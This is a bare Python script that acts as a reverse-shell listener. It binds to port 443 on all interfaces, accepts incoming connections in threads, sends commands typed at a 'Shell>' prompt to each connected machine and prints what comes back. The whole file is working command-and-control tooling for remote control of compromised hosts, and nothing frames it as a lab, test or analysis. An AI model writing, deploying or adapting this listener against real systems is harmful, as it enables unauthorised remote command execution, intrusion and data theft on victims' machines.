import socket
import threading

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    while True:
        try:
            cmd = input("Shell> ")
            if not cmd: continue
            conn.send(cmd.encode())
            data = conn.recv(4096)
            print(data.decode(errors='ignore'))
        except:
            break
    conn.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 443))
server.listen(5)
print("[*] Listener active on 443")

while True:
    conn, addr = server.accept()
    threading.Thread(target=handle_client, args=(conn, addr)).start()
